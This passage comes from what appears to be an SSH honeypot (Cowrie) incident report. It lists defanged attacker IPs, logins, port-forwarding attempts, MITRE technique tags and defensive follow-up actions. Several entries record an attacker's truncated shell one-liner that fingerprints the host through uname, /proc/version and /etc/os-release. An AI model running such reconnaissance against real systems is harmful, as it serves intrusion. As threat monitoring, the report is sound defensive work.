| `2026-07-08 04:16:05` | `cowrie.session.connect` |
| `2026-07-08 04:16:05` | `cowrie.client.version` |
| `2026-07-08 04:16:05` | `cowrie.client.kex` |
| `2026-07-08 04:16:09` | `cowrie.login.success` |
| `2026-07-08 04:16:09` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.228[.]228` to AbuseIPDB if not already reported
- [ ] Block `122.187.228[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9780170e6b3e

| Field | Detail |
|---|---|
| **Source IP** | `183.171.53[.]82` |
| **First Seen** | 2026-07-08 04:16 |
| **Last Seen** | 2026-07-08 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:16:29` | `cowrie.session.connect` |
| `2026-07-08 04:16:29` | `cowrie.client.version` |
| `2026-07-08 04:16:29` | `cowrie.client.kex` |
| `2026-07-08 04:16:32` | `cowrie.login.success` |
| `2026-07-08 04:16:33` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.171.53[.]82` to AbuseIPDB if not already reported
- [ ] Block `183.171.53[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d5fce021ec

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-08 04:16 |
| **Last Seen** | 2026-07-08 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:16:38` | `cowrie.session.connect` |
| `2026-07-08 04:16:39` | `cowrie.client.version` |
| `2026-07-08 04:16:39` | `cowrie.client.kex` |
| `2026-07-08 04:16:42` | `cowrie.login.success` |
| `2026-07-08 04:16:42` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0870f8c96997

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:16 |
| **Last Seen** | 2026-07-08 04:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:16:59` | `cowrie.session.connect` |
| `2026-07-08 04:16:59` | `cowrie.client.version` |
| `2026-07-08 04:16:59` | `cowrie.client.kex` |
| `2026-07-08 04:17:01` | `cowrie.login.success` |
| `2026-07-08 04:17:03` | `cowrie.session.params` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.success` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.command.input` |
| `2026-07-08 04:17:03` | `cowrie.log.closed` |
| `2026-07-08 04:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6837d3eee3d

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-08 04:17 |
| **Last Seen** | 2026-07-08 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:17:47` | `cowrie.session.connect` |
| `2026-07-08 04:17:47` | `cowrie.client.version` |
| `2026-07-08 04:17:47` | `cowrie.client.kex` |
| `2026-07-08 04:17:48` | `cowrie.login.success` |
| `2026-07-08 04:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99661a4de675

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-08 04:17 |
| **Last Seen** | 2026-07-08 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:17:47` | `cowrie.session.connect` |
| `2026-07-08 04:17:47` | `cowrie.client.version` |
| `2026-07-08 04:17:47` | `cowrie.client.kex` |
| `2026-07-08 04:17:48` | `cowrie.login.success` |
| `2026-07-08 04:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89fc3aed0971

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:18 |
| **Last Seen** | 2026-07-08 04:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:18:31` | `cowrie.session.connect` |
| `2026-07-08 04:18:31` | `cowrie.client.version` |
| `2026-07-08 04:18:31` | `cowrie.client.kex` |
| `2026-07-08 04:18:33` | `cowrie.login.success` |
| `2026-07-08 04:18:34` | `cowrie.session.params` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.success` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:34` | `cowrie.command.input` |
| `2026-07-08 04:18:35` | `cowrie.log.closed` |
| `2026-07-08 04:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde89892011b

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-08 04:19 |
| **Last Seen** | 2026-07-08 04:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:19:23` | `cowrie.session.connect` |
| `2026-07-08 04:19:24` | `cowrie.client.version` |
| `2026-07-08 04:19:24` | `cowrie.client.kex` |
| `2026-07-08 04:19:25` | `cowrie.login.success` |
| `2026-07-08 04:19:26` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53afd0c79bf4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:20 |
| **Last Seen** | 2026-07-08 04:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:20:03` | `cowrie.session.connect` |
| `2026-07-08 04:20:03` | `cowrie.client.version` |
| `2026-07-08 04:20:03` | `cowrie.client.kex` |
| `2026-07-08 04:20:05` | `cowrie.login.success` |
| `2026-07-08 04:20:06` | `cowrie.session.params` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.success` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:06` | `cowrie.command.input` |
| `2026-07-08 04:20:07` | `cowrie.log.closed` |
| `2026-07-08 04:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac37b923943

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:21 |
| **Last Seen** | 2026-07-08 04:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:21:35` | `cowrie.session.connect` |
| `2026-07-08 04:21:35` | `cowrie.client.version` |
| `2026-07-08 04:21:35` | `cowrie.client.kex` |
| `2026-07-08 04:21:37` | `cowrie.login.success` |
| `2026-07-08 04:21:38` | `cowrie.session.params` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.success` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.command.input` |
| `2026-07-08 04:21:38` | `cowrie.log.closed` |
| `2026-07-08 04:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707db1ea7a99

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:23 |
| **Last Seen** | 2026-07-08 04:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:23:12` | `cowrie.session.connect` |
| `2026-07-08 04:23:12` | `cowrie.client.version` |
| `2026-07-08 04:23:12` | `cowrie.client.kex` |
| `2026-07-08 04:23:13` | `cowrie.login.success` |
| `2026-07-08 04:23:14` | `cowrie.session.params` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.success` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:14` | `cowrie.command.input` |
| `2026-07-08 04:23:15` | `cowrie.log.closed` |
| `2026-07-08 04:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c42f39cd916

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 04:23 |
| **Last Seen** | 2026-07-08 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:23:53` | `cowrie.session.connect` |
| `2026-07-08 04:23:53` | `cowrie.client.version` |
| `2026-07-08 04:23:53` | `cowrie.client.kex` |
| `2026-07-08 04:23:54` | `cowrie.login.success` |
| `2026-07-08 04:23:55` | `cowrie.session.params` |
| `2026-07-08 04:23:55` | `cowrie.command.input` |
| `2026-07-08 04:23:55` | `cowrie.log.closed` |
| `2026-07-08 04:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0578e3ccd456

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:24 |
| **Last Seen** | 2026-07-08 04:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:24:56` | `cowrie.session.connect` |
| `2026-07-08 04:24:57` | `cowrie.client.version` |
| `2026-07-08 04:24:57` | `cowrie.client.kex` |
| `2026-07-08 04:24:57` | `cowrie.login.success` |
| `2026-07-08 04:24:59` | `cowrie.session.params` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.success` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.command.input` |
| `2026-07-08 04:24:59` | `cowrie.log.closed` |
| `2026-07-08 04:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512d23152087

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:26 |
| **Last Seen** | 2026-07-08 04:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:26:45` | `cowrie.session.connect` |
| `2026-07-08 04:26:45` | `cowrie.client.version` |
| `2026-07-08 04:26:45` | `cowrie.client.kex` |
| `2026-07-08 04:26:46` | `cowrie.login.success` |
| `2026-07-08 04:26:47` | `cowrie.session.params` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.success` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.command.input` |
| `2026-07-08 04:26:47` | `cowrie.log.closed` |
| `2026-07-08 04:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7fc7e6c707c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:28 |
| **Last Seen** | 2026-07-08 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:28:37` | `cowrie.session.connect` |
| `2026-07-08 04:28:37` | `cowrie.client.version` |
| `2026-07-08 04:28:37` | `cowrie.client.kex` |
| `2026-07-08 04:28:38` | `cowrie.login.success` |
| `2026-07-08 04:28:39` | `cowrie.session.params` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.success` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.command.input` |
| `2026-07-08 04:28:39` | `cowrie.log.closed` |
| `2026-07-08 04:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b0d6effb36d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 04:29 |
| **Last Seen** | 2026-07-08 04:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:29:08` | `cowrie.session.connect` |
| `2026-07-08 04:29:09` | `cowrie.client.version` |
| `2026-07-08 04:29:09` | `cowrie.client.kex` |
| `2026-07-08 04:29:15` | `cowrie.login.success` |
| `2026-07-08 04:29:17` | `cowrie.session.params` |
| `2026-07-08 04:29:17` | `cowrie.command.input` |
| `2026-07-08 04:29:19` | `cowrie.log.closed` |
| `2026-07-08 04:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c32677e30e7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:30 |
| **Last Seen** | 2026-07-08 04:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:30:39` | `cowrie.session.connect` |
| `2026-07-08 04:30:39` | `cowrie.client.version` |
| `2026-07-08 04:30:39` | `cowrie.client.kex` |
| `2026-07-08 04:30:39` | `cowrie.login.success` |
| `2026-07-08 04:30:40` | `cowrie.session.params` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
